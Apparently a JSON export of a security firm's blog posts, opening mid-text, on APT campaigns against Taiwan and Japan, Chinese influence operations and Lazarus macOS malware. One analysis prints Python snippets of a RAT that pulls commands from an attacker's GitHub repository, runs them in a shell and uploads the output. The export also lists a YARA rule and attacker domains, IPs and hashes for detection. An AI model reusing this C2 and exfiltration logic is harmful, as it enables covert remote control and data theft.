IOC）匯入各式資安設備中，強化威脅偵測與識別。\n\n* 表一中所有的惡意程式雜湊值\n* Yara Rule\n\n```\nrule RAT_Github\n{\n    meta:\n        description= \"detecting GithubRAT memory\"\n        author = \"TeamT5\"\n        date = \"2020-08-05\"\n    \n    strings:\n        $str1 = \"pyi-windows-manifest-filename\"\n        $str2 = \"https://api.github.com/repos/{}/{}/contents/{}/{}\"\n        $str3 = \"back_cmd\"\n        $str4 = \"put_git_answer\"       \n    \n        all of them\n}\n```\n\n![202008-3](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-3_222c942e82.png)\n_圖三、ThreatSonar 供資安人員快速匯入 Yara Rule 並自訂威脅等級_","title":"Github 不再只是版控平台，還是 APT 後門中繼站","createdAt":"2020-08-09T15:59:08.518Z","updatedAt":"2020-12-14T08:22:51.190Z","__v":0,"id":"5f301d4c163518003f86da79"}],"createdAt":"2020-08-09T15:59:08.292Z","updatedAt":"2021-01-27T04:40:39.819Z","__v":1,"author":"5eeae43e163518003f86d914","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1597026081/brina-blum-Bb_X4JgSqIM-unsplash_8163042d8a.jpg","id":"5f301d4c163518003f86da78"}],"id":"5ecf8956fedd7f004b269791"},{"_id":"5ecf890dfedd7f004b26978e","name":"APT","createdAt":"2020-05-28T09:49:01.076Z","updatedAt":"2020-10-14T03:41:17.235Z","__v":0,"posts":[{"publish":true,"enable_form":false,"tags":["5eec17e7163518003f86d931","5eec183c163518003f86d933","5eec125f163518003f86d920","5eec12cf163518003f86d923","5ecf890dfedd7f004b26978e","5ecf8852fedd7f004b269789"],"relative_posts":["5ecf7b2afedd7f004b269777"],"_id":"5ecab5be602fc90040476057","post_url":"teamt5-collaborates-with-macnica-networks-and-terilogy-technology-to-help-critical-infrastructure-combat-apt-attacks","post_name":"TeamT5 聯手 Macnica Networks 與 Terilogy Technology，幫助「關鍵基礎設施」對抗 APT 攻擊","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590343084/20200505_cover_d628be4c18.jpg","contents":[{"locale":"tw","_id":"5ecab5be602fc90040476058","title":"TeamT5 聯手 Macnica Networks 與 Terilogy Technology，幫助「關鍵基礎設施」對抗 APT 攻擊","context":"TeamT5 攜手日商 Macnica Networks 與 Terilogy Technology 合作提供「企業 APT 攻擊防疫計畫」，協助日本境內關鍵基礎設施（Critical Infrastructure）的相關企業在新冠肺炎疫情期間對抗 APT 攻擊（Advanced Persistent Threat）。\n\n「企業 APT 攻擊防疫計畫」將使用 ThreatSonar 掃描與診斷 14 個關鍵基礎設施產業，包括：政府、軍事國防、情報通信、金融、航空、鐵路、電力、水利、醫療、物流、化學、石油瓦斯及半導體等。我們的威脅診斷工具 ThreatSonar 可協助企業防範資安事件於未然，及早偵測潛藏的 APT 風險。\n\n同時因應台灣各大企業，尤其是關鍵基礎設施營運單位，在疫情時期大幅上升的資安危機，TeamT5 同時推出「遠端辦公防疫計畫」（WFH Cloud Program）來替各大企業診斷與辨認一般防毒軟體無法有效守備的 APT 攻擊。\n\n關於日本境內的「企業 APT 攻擊防疫計畫」申請方式與服務內容，請洽詢當地代理商來了解更多申請資訊與適用辦法。至於台灣的「遠端辦公防疫計畫」，請洽台灣業務。","createdAt":"2020-05-24T17:58:22.019Z","updatedAt":"2020-07-02T08:49:41.640Z","__v":0,"id":"5ecab5be602fc90040476058"}],"createdAt":"2020-05-24T17:58:22.015Z","updatedAt":"2020-12-16T01:47:55.087Z","__v":1,"topic":"5ecaa036a792d70040a0d8b4","author":"5eec3483163518003f86d943","publish_date":"2020-05-05T02:30:00.000Z","id":"5ecab5be602fc90040476057"},{"publish":true,"enable_form":false,"tags":["5eec17e7163518003f86d931","5eec125f163518003f86d920","5eec1270163518003f86d921","5ecf890dfedd7f004b26978e"],"relative_posts":["5ecab5be602fc90040476057"],"_id":"5ecf7b2afedd7f004b269777","post_url":"teamt5-and-macnica-networks-release-joint-project-on-2019-s-apt-attacks-in-japan","post_name":"TeamT5 and Macnica Networks Release Joint Project on 2019's APT Attacks in Japan","contents":[{"locale":"en","_id":"5ecf7b2afedd7f004b269778","context":"TeamT5 and Macnica Networks have published our joint research on APT attacks targeting Japan over the past year. In this collaborative research, we provide valuable insight into four advanced persistent threat (APT) groups and actors. The full report will first be available in Japanese and can be accessed at Macnica Networks' website.\n \nThe APT groups' highlighted in this joint project were believed to have been launching cyber espionage campaigns elsewhere in the world. To enhance APT defense strategies, we take a closer look at the four APT groups, including DarkHotel, Huapi (BlackTech), Nian (Tick), and one unclassified backdoor LODEINFO. These APT groups have been threatening crucial sectors in Japan, such as government, military and defense, manufacturing, telecommunication, education, media, and etc.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590655880/APT_Attack_Timeline_2019_2da7de1832.png)\n_The attack timeline of the APT groups' campaigns in Japan in 2019._\n\nMacnica Networks is one of the largest system integrators (SI) in Japan. As a leading network distributor, it provides a wide range of advanced network products and information technology to government offices, educational institutions, and general companies.\n\nTo access the full report, please visit: [https://www.macnica.net/mpressioncss/feature_06.html/](https://www.macnica.net/mpressioncss/feature_06.html/ \"https://www.macnica.net/mpressioncss/feature_06.html/\")","title":"TeamT5 and Macnica Networks Release Joint Project on 2019's APT Attacks in Japan","createdAt":"2020-05-28T08:49:46.852Z","updatedAt":"2020-08-21T18:39:35.275Z","__v":0,"id":"5ecf7b2afedd7f004b269778"}],"createdAt":"2020-05-28T08:49:46.844Z","updatedAt":"2020-10-14T03:41:17.253Z","__v":1,"banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590655529/20200527_cover_fafcb121df.jpg","author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","publish_date":"2020-05-27T02:00:00.000Z","id":"5ecf7b2afedd7f004b269777"},{"publish":true,"enable_form":false,"tags":["5f30c347163518003f86daa6","5f30c34c163518003f86daa7","5ecf8956fedd7f004b269791","5ecf890dfedd7f004b26978e"],"relative_posts":["5fd1cef79f8bdc004a7fdf4a"],"_id":"5f301d4c163518003f86da78","post_url":"Introducing-githubrat-malware-using-github-as-c2-server","post_name":"Github 不再只是版控平台，還是 APT 後門中繼站","publish_date":"2020-08-13T02:30:00.000Z","contents":[{"locale":"tw","_id":"5f301d4c163518003f86da79","context":"圖片來源：[Unsplash](https://unsplash.com/photos/Bb_X4JgSqIM)\n\n## 前言\nTeamT5 近期於台灣某政府機關發現駭客入侵事件，駭客於受害端點上植入遠端控制程式（Remote Access Tool, RAT）。特別之處在於，駭客透過 GitHub 雲端服務做為中繼站，藉此規避網路閘道端資安設備的偵測與攔阻。下圖為該受害主機向中繼站報到時，所回傳的端點資訊，可清楚看出該端點的域名為台灣政府機關。\n\n![202008-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022323/202008-1_2e7fc527df.png)\n_圖一、台灣某政府單位受駭_\n\n## 技術分析\nTeamT5 分析此 GithubRAT 後門程式，發現原為 Python Script，透過 PyInstaller 封裝為 Windows 執行檔。\n\nGithubRAT 執行後，會透過 api.github.com 連線至駭客的 Github 專案（Repository），並將駭客下達指令的結果回傳至 Github 專案上，其檔名為 Base64 編碼後的受害電腦名稱，網路封包如下圖所示。\n\n![202008-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-2_6b4b387c8f.png)\n_圖二、GithubRAT 使用 api.github.com 作為惡意中繼站_\n\n<br>\n\nTeamT5 分析 GithubRAT 惡意程式運作原理，將其執行步驟拆解如下：\n\n 1. 連線至駭客的 Github 專案，如下所示。\n \n    ```\n    def __init__(self):\n        self.back_git_heart = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_HEART, self.back_sid)\n        self.back_git_cmd = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_CMD, self.back_sid)\n        self.back_git_answer = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_ANSWER, self.back_sid)\n        self.back_git_token = 'https://api.github.com/repos/{}/{}/contents/{}/{}'.format(B_USER, B_PROJECT, B_PATH, 'token')\n     ```\n \n 2. 將電腦名稱透過 Base64 編碼並註冊回傳至 Github 專案中。\n 3. 從 Github 專案下載駭客的控制指令。\n 4. 利用命令提示字元 cmd.exe 執行駭客指令，如下所示。\n\n     ```\n    def back_cmd(self, command):\n        _t_data = 'timeout'\n        p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)\n        _t = 10\n        while _t > 0:\n            time.sleep(1)\n            if p.poll() == 0:\n                _t_data = p.stdout.read() + p.stderr.read()\n                break\n            _t = _t - 1\n        return _t_data\n    ```\n \n 5. 將指令執行之結果回傳至 Github 專案中，如下所示。\n\n ```\n def _put_git_answer(self, data):\n    _result_status = False\n    _status, _sha = self._get_git_hash(self.back_git_answer)\n    d = {'message': 'my commit message',\n       'content': base64.b64encode(data),\n       'sha': _sha\n       }\n    headers = {'Authorization': 'token ' + B_TOKEN,'user-agent': B_USER_AGENT}\n    try:\n        r = requests.put(url=self.back_git_answer, data=json.dumps(d), headers=headers)\n        if not _status and r.status_code == 201:\n            _result_status = True\n        if _sha and r.status_code == 200:\n            _result_status = True\n    except Exception as e:\n        pass\n    return _result_status\n ```\n \n 6. 不斷重複步驟 3 至步驟 5。\n\n<br>\n\n另外，我們也發現駭客放置許多惡意程式於該 Github 專案中，其中包含密碼竊取（Password Dump）、漏洞利用（Exploit）及後門（Backdoor）等惡意程式，其詳細清單如下表所示。\n\n|Hash|說明|\n|---|---|\n|a5f12ee032af8e8dd5a373f611f64726|Backdoor Loader|\n|944465a0edd09d8eb569630a68ee111c|Cobalt Strike Payload|\n|e5ed0de0100f670324202bbf5982a80a|Cobalt Strike  Payload|\n|4f67e80118dcc4a42ebcb2af2cad65ce|Hacktool，CVE-2014-4113 Exploit|\n|0468a816c167ca5ad301dc408eb19fb5|HackTool，Chrome Password Dump|\n|b33c7c022e1a25a981faabfc0fe53f6d|HackTool，AD Password Brute-Force Tool|\n|5178eb048ecaed83b69aa277a7c6d784|HackTool，NETBIOS NameServer Scanner|\n|2f9b582378c559ca66b48abd51f436a0|HackTool，TCP Port Banner Scanner|\n|aad8b062891c0715a1842270c0a871eb|HackTool，MS-17-010 Eternalblue Scanner|\n|41e32076f2e75181ce9f1cac6099a918|HackTool，MS-17-010 Eternalblue Scanner|\n|1a41f9550964ada62f87f6a0b79e37ba|HackTool，NETBIOS NameServer Scanner|\n_表一、駭客 GitHub 專案中的惡意程式列表_\n\n## 影響與建議\n由於許多單位都會使用 Github 服務作為版本控制之用，因此對 Github 的存取都會是許可的狀態，這也變成駭客反過來利用的機制。駭客利用大眾對於雲端服務的需求，轉而透過該雲端服務作為中繼站，遠端控制受害電腦。同時，該 GithubRAT 係透過 PyInstaller 進行封裝，駭客使用其他封裝工具即可快速改變檔案雜湊值，因此 TeamT5 建議可透過網路連線紀錄來威脅狩獵（Threat Hunting），找尋環境內是否有密集且定期的 api.github.com 連線紀錄，藉此找出環境中異常的網路存取連線。\n\n最後，若單位遭遇進階持續性威脅（Advanced Persistent Threat, APT）時，建議可使用 TeamT5 的 ThreatSonar 惡意威脅鑑識分析平臺，可有效偵測此類進階攻擊手法，並快速完成事件關聯與回應。TeamT5 建議可將下方威脅指標（Indicator of Compromise, IOC）匯入各式資安設備中，強化威脅偵測與識別。\n\n* 表一中所有的惡意程式雜湊值\n* Yara Rule\n\n```\nrule RAT_Github\n{\n    meta:\n        description= \"detecting GithubRAT memory\"\n        author = \"TeamT5\"\n        date = \"2020-08-05\"\n    \n    strings:\n        $str1 = \"pyi-windows-manifest-filename\"\n        $str2 = \"https://api.github.com/repos/{}/{}/contents/{}/{}\"\n        $str3 = \"back_cmd\"\n        $str4 = \"put_git_answer\"       \n    \n        all of them\n}\n```\n\n![202008-3](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-3_222c942e82.png)\n_圖三、ThreatSonar 供資安人員快速匯入 Yara Rule 並自訂威脅等級_","title":"Github 不再只是版控平台，還是 APT 後門中繼站","createdAt":"2020-08-09T15:59:08.518Z","updatedAt":"2020-12-14T08:22:51.190Z","__v":0,"id":"5f301d4c163518003f86da79"}],"createdAt":"2020-08-09T15:59:08.292Z","updatedAt":"2021-01-27T04:40:39.819Z","__v":1,"author":"5eeae43e163518003f86d914","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1597026081/brina-blum-Bb_X4JgSqIM-unsplash_8163042d8a.jpg","id":"5f301d4c163518003f86da78"},{"publish":true,"enable_form":false,"tags":["5f3fdebe163518003f86dad8","5ecf6d12fedd7f004b26974e","5f3fdef3163518003f86dad9","5f3fdefb163518003f86dada","5ecf890dfedd7f004b26978e"],"relative_posts":["5fd95f48542153003465f6e3"],"_id":"5f3fdeb5163518003f86dad5","post_url":"mjib-holds-briefing-on-chinese-hackers-attacks-on-taiwanese-government-agencies","post_name":"調查局 08/19 公布中國對台灣政府機關駭侵事件說明","contents":[{"locale":"tw","_id":"5f3fdeb5163518003f86dad6","context":"圖片來源：[Unsplash](https://unsplash.com/photos/8OyKWQgBsKQ)\n\n# 前言\n\n法務部調查局綜整近期所偵辦的數起台灣政府機關遭駭案件，於 19 日發表記者會，提到政府部門的委外資訊服務供應商遭中國駭客組織攻擊現況，目前已知有市政府、水資源局等至少 10 個單位，以及 4 家資訊服務供應商遇害。\n\n調查局資安工作站也發現，駭客在入侵政府機關內部的主機與伺服器後，為了要長期潛伏以及將獲取資料傳出，還會安裝 SoftEther VPN 程式，以連線到駭客指定的中繼站。\n\n本次調查局公布的攻擊族群：MustangPanda、APT40、Blacktech 與 Taidoor，皆是 TeamT5 長期追蹤的標的，我們有信心能夠偵測這些族群使用的後門程式、駭客工具以及攻擊手法。\n\n![0822-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1598021396/0822-1_2529e698d3.png)\n*圖一、駭客透過供應鏈攻擊我政府機關 -1（圖片來源：法務部調查局）*\n\n![0822-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1598021396/0822-2_a119c17629.png)\n*圖二、駭客透過供應鏈攻擊我政府機關 -2（圖片來源：法務部調查局）*\n\n<br>\n\n# IOC 情資\nTeamT5 長期進行駭客追蹤研究，根據法務部調查局所提供的情資內容，關聯出駭客族群慣用的惡意程式與相關 IOC 情資供使用者匯入至閘道端或端點防護設備比對使用，詳細惡意程式說明與 IOC 清單如下所示。\n\n<br>\n\n|惡意程式家族|類型|描述|攻擊族群|首次出現|\n|----|----|----|----|----|\n|dbgPrint |RAT |dbgPrint 為中國駭客族群 HUAPI 慣用的後門程式，其名稱來自於該後門程式早期版本的字串(strings)內容。dbgPrint 後門程式通常由 PE 型態的 Loader、插入 shellcode 的 DLL 檔及惡意 Payload 所組成。同時也具備防毒免殺(anti-antivirus)的功能模組。|HUAPI (又稱為 Plead 或 Blacktech)|2009 年|\n|CobaltStrike Beacon |RAT |Cobalt Strike 是一款滲透測試或紅隊演練常使用的攻擊框架，而 CobaltStrike Beacon 則是從 Cobalt Strike 攻擊框架所產生的惡意 Payload。雖然 Cobalt Strike 為商業付費工具，但是經過破解並流傳於許多論壇或網站中，因此有許多駭客皆透過他進行惡意攻擊。|商業付費工具，無法明確定義出背後的攻擊族群|2016 年|\n\n*表一、惡意程式分析說明*\n\n<br>\n<br>\n\n|IOC|類型|提供來源|\n|----|----|----|----|\n|manage.lutengtw.com|Domain|法務部調查局|\n|dccpulic.lutengtw.com|Domain|法務部調查局|\n|trust.utoggsv.com|Domain|法務部調查局|\n|wg1.inkeslive.com|Domain|法務部調查局|\n|k3ad01.rutentw.com|Domain|法務部調查局|\n|ams05.csksogo.com|Domain|法務部調查局|\n|edgekey.whybbot.com|Domain|法務部調查局|\n|shed.inkeslive.com|Domain|法務部調查局|\n|ap21.gckerda.com|Domain|法務部調查局|\n|cornerth.com|Domain|法務部調查局|\n|teamcorner.nctu.me|Domain|法務部調查局|\n|43.240.12.81|IP Address|法務部調查局|\n|45.124.25.31|IP Address|法務部調查局|\n|45.124.25.226|IP Address|法務部調查局|\n|103.193.149.26|IP Address|法務部調查局|\n|103.240.202.34|IP Address|法務部調查局|\n|a8373a143a915518a33c4af19fff01e7|MD5 Hash|TeamT5|\n|20714b487b5b63ff8e52b911d19d6da1|MD5 Hash|TeamT5|\n|6c490c833bfff677c89d9bb81bef0cf5|MD5 Hash|TeamT5|\n|d395580fea6fb840798dc1ee65756484|MD5 Hash|TeamT5|\n|4a1941df8b251716f66e2777425ac0e5|MD5 Hash|TeamT5|\n|c11f40af68c07b309bd103d69b7bb14a|MD5 Hash|TeamT5|\n|387fe30ffc270939c299d1eaebcdcd4d|MD5 Hash|TeamT5|\n|93bfdce35e3ab86508e09deedca6552f|MD5 Hash|TeamT5|\n|1857fbce5c5269a1d4e40204ccccd7d1|MD5 Hash|TeamT5|\n|www.kaspersky-security.net|Domain|TeamT5|\n|www.symantec-endpoint.net|Domain|TeamT5|\n|www.symantec-product.com|Domain|TeamT5|\n|update.symantec-product.com|Domain|TeamT5|\n|update.trendmicro-service.com|Domain|TeamT5|\n|googleupdatesrv.com|Domain|TeamT5|\n|103.234.96.213|IP Address|TeamT5|\n|103.242.0.152|IP Address|TeamT5|\n|43.240.12.80|IP Address|TeamT5|\n|43.240.12.82|IP Address|TeamT5|\n|43.240.12.83|IP Address|TeamT5|\n|45.32.43.59|IP Address|TeamT5|\n|45.76.189.109|IP Address|TeamT5|\n\n*表二、IOC 清單*\n\n<br>\n\nThreatSonar 惡意威脅鑑識分析平臺的用戶，可將上方表二之 IOC 匯入以強化威脅偵測與識別，亦可追溯比對過去資料是否命中 IOC。示意圖如下。\n\n![0822-3.2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1598078952/0822-3.2_a52efbee16.png)\n*圖三、ThreatSonar 支援 Hash、IP 及 Domain IOC 情資匯入*\n\n<br>\n\n# 如何透過威脅狩獵找出 SoftEther VPN 程式\n根據法務部調查局的偵辦結果，駭客為了長期潛伏於受害環境，因此會透過 SoftEther 這類的合法 VPN 程式進行遠端控制。ThreatSonar 具備主動威脅狩獵（Threat Hunting）功能，故可以快速地在環境中找出 SoftEther VPN 程式。\n\n其步驟為在威脅狩獵（Hunter）功能中，切換 Scope 至憑證（Certificate），搜尋 \"filename ~ softether\"（請選擇 Engine Version 為全選），可依憑證內容搜尋環境內符合條件的 SoftEther 憑證及其對應的端點與程式清單。其流程步驟示意圖如下。\n\n![0822-4.2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1598078952/0822-4.2_7ff72c52b4.png)\n*圖四、以 filename 查詢符合條件的 SoftEther 憑證*\n\n<br>\n\n![0822-5.2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1598078951/0822-5.2_63428b1e98.png)\n*圖五、具備 SoftEther 憑證的端點與程式清單*\n\n<br>\n\n![0822-6.2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1598078951/0822-6.2_418ed6f1a2.png)\n*圖六、駭客將 SoftEther VPN 程式偽裝成 svchost.exe*\n","title":"調查局 08/19 公布中國對台灣政府機關駭侵事件說明","createdAt":"2020-08-21T14:48:21.182Z","updatedAt":"2020-08-22T07:19:21.410Z","__v":0,"id":"5f3fdeb5163518003f86dad6"}],"createdAt":"2020-08-21T14:48:21.166Z","updatedAt":"2021-01-27T04:40:55.494Z","__v":1,"author":"5eeae43e163518003f86d914","topic":"5ecaa01fa792d70040a0d8b2","publish_date":"2020-08-22T07:00:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1598023063/markus-spiske-8OyKWQgBsKQ-unsplash_%281%29_ced6b5f864.jpg","id":"5f3fdeb5163518003f86dad5"},{"publish":true,"enable_form":true,"tags":["5ecf6ceefedd7f004b26974a","5f86733cda3440005757a93f","5f0e6315163518003f86d9a9","5ecf890dfedd7f004b26978e","5f867386da3440005757a940","5eec1435163518003f86d92e","5f86a8b7da3440005757a946"],"relative_posts":["5ecab44c602fc90040476047","5f0e5aad163518003f86d97e","602e177fc56e80003f985a0e"],"_id":"5f866d3ada3440005757a928","post_name":"InfoOp White Paper III: China’s Social Manipulation outside the Great Firewall","post_url":"info-op-white-paper-iii-china-s-social-manipulation-outside-the-great-firewall","publish_date":"2020-10-15T02:30:00.000Z","contents":[{"locale":"en","_id":"5f866d3ada3440005757a929","title":"InfoOp White Paper III: China’s Social Manipulation outside the Great Firewall","context":"In the final part of our Information Operation White Paper, we will demonstrate China's Information Operations (InfoOps) targeting the global audience. The first part of the report displays a brief overview of its overt operations which are carried out by state media, embassies, and diplomats. Then we look into the covert operations, which can be observed in pro-China fan pages, content farms, and spam botnet. Last but not least, we provide the case study of \"Operation Juiker\" on Taiwan's largest forum PTT, which suggests the possibility of the APT (Advanced Persistent Threat) actors entering the threat landscape.\n\n#### Key Takeaways\n\n1. China has escalated the level of overt InfoOps via state-media and diplomats.\n<br>\n<br>\nChinese state media, diplomats, and embassies are the main actors of Chinese overt InfoOps. They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n<br>\n<br>\n2. Covert InfoOps remain active on Western social media platforms.\n<br>\n<br>\n2020 is a year which has set many records. This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n<br>\n <br>\n3. APT actors might have entered the InfoOps threat landscape.\n<br>\n<br>\nThe situation is become more alarming as we discovered that the Advanced Persistent Threat (APT) actors might have entered the InfoOps threat landscape. APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n<br>\n<br>\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n<br>\n<br>\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks. We suggest that it is crucial for government units, critical infrastructure operators, and major business vendors to apply threat intelligence to combat this issue.\n<br>\n<br>\n\nIf you are interested in this white paper, please fill out the form below and get the full-text PDF.\n<br>\n<br>\nAnd don't miss our blog updates! Follow us on [Twitter](https://twitter.com/TeamT5_Official).\n<br>\n<br>","createdAt":"2020-10-14T03:15:06.804Z","updatedAt":"2020-12-04T03:23:18.122Z","__v":0,"id":"5f866d3ada3440005757a929"},{"locale":"tw","_id":"5f86a7b8da3440005757a941","title":"資訊戰白皮書三部曲：中國的社群操弄","context":"在 TeamT5〈資訊戰白皮書〉的最後一部曲中，我們將呈現中國的資訊作戰（Information Operation）是如何瞄準全球社群媒體使用者。TeamT5 希望透過這系列白皮書，分享我們作為資安研究員，如何理解中國的社群操弄。\n\n此份白皮書的前兩個章節，介紹中國檯面上與檯面下的行動。首先觀察中國在檯面上（overt operation）如何透過中國的官媒、大使館、外交官，在社群媒體創造自己的聲量。接著分析中國檯面下的行動（covert operation），進一步研究那些無法被輕易歸因的粉絲頁、內容農場與大量的僵屍帳號。最後一章將以 PTT 論壇上關於 Juiker 的假新聞攻擊為例，提出資訊戰當中，我們最擔心的 —— 由「進階持續性滲透威脅」（APT）發起的假新聞攻擊。\n\n<br>\n#### 報告摘要\n\n1. 中國持續透過官媒與外交官進行檯面上的社群操弄\n<br>\n<br>\n中國的官媒、外交官、大使館是中國檯面上的主要行動者。這些行動者負責美化中國外在形象，以及散播對中國執政黨有利的論述。根據我們的觀察，這些帳號在西方社群媒體中都擁有大量的追蹤者，Facebook 粉絲頁中，追蹤數排名世界前 20 名的新聞媒體，第一名到第四名就是由中國官媒粉絲頁 CGTN、China Daily、People's Daily、Xinhua News 包辦。中國檯面上的社群操弄，主要針對位在美國、加拿大、澳洲等英語系國家的海外華人，並透過他們對當地的政治進行一定影響。\n<br>\n<br>\n2. 檯面下的社群操弄持續在西方主流社群平台出沒\n<br>\n<br>\n2020 年，西方主流社群平台 Facebook、Twitter、Google 等，都曾數次移除各自平台上與中國有關的假帳號。儘管平台方已如此頻繁地掃蕩，許多隱匿的行動者仍然在各大平台上出沒，那些曾遭移除的帳號背後，有行動者持續透過註冊新網域和帳號捲土重來。我們不斷觀察到許多可疑帳號，例如許多擁有中國管理員的粉絲頁，會搬運微博上的政治宣傳。更有甚者，我們發現許多配備精良的攻擊者，會自己架設網站和疑似是自動化產生的僵屍帳號，來協助中國政府攻擊香港抗爭者。\n<br>\n<br>\n3. APT 攻擊者很可能參與了社群媒體上的資訊戰\n<br>\n<br>\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n<br>\n<br>\n4. 威脅情資作為對抗資訊戰的重要環節\n<br>\n<br>\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n<br>\n<br>\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n<br>\n<br>\n追蹤 TeamT5 [Twitter](https://twitter.com/TeamT5_Official)，資安動態不漏接！\n<br>","createdAt":"2020-10-14T07:24:40.028Z","updatedAt":"2020-12-04T03:23:18.109Z","__v":0,"id":"5f86a7b8da3440005757a941"}],"createdAt":"2020-10-14T03:15:06.772Z","updatedAt":"2021-06-02T05:41:47.633Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa02ba792d70040a0d8b3","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1602486856/2020%E7%99%BD%E7%9A%AE%E6%9B%B8V3%E5%AE%A3%E5%82%B3%E5%9C%96_blog_1920x1280_26f322ea32.jpg","attachment_id":"1IiFL4iEBKoOwQkSbmwVsQMXWOLV4r9pN","id":"5f866d3ada3440005757a928"},{"publish":true,"enable_form":false,"tags":["5ecf890dfedd7f004b26978e","5fd6bb15af135000464926d8","5fd6bb1daf135000464926d9","5fd6bb3aaf135000464926db","5fd6bb25af135000464926da"],"relative_posts":["5f301d4c163518003f86da78"],"_id":"5fd1cef79f8bdc004a7fdf4a","post_url":"north-korea-linked-lazarus-apt-uses-a-macos-malware-in-cryptocurrency-exchange-attack","post_name":"macOS 用戶當心！北韓駭客 Lazarus 將目標瞄準虛擬貨幣交易用戶","publish_date":"2020-12-22T01:00:00.000Z","contents":[{"locale":"tw","_id":"5fd1cef89f8bdc004a7fdf4b","context":"圖片來源：[Pixabay](https://pixabay.com/illustrations/the-company-cryptocurrency-mining-3338207/)\n\n## 摘要\nTeamT5 近期掌握情資，北韓 APT 駭客 Lazarus 開發出 macOS 作業系統的惡意程式 MovieRAT，並試圖攻擊虛擬貨幣的使用者，藉此盜取帳戶內的虛擬貨幣。\n\n## 技術分析\nTeamT5 透過情資管道取得惡意樣本（53d9af8829a9c7f6f177178885901c01），其檔案名稱為 Esilet.dmg，是 macOS 的第三方應用程式安裝檔，如圖一所示。該樣本執行後，會連線至 esilet.com 網站，該網站為虛擬貨幣交易平台，但經過 TeamT5 深入追查後發現，esilet.com 於 2020 年 6 月 12 日註冊，因此可以確認為駭客近期所發動的攻擊行為，如圖二所示。\n\n![2020-12-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607910258/2020-12-1_38f3073f52.png)\n_圖一、Esilet.dmg 執行畫面_\n\n<br>\n\n![2020-12-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909875/2020-12-2_61901a7ea4.png)\n_圖二、esilet.com 網域註冊時間_\n\n<br>\n\nesilet.com 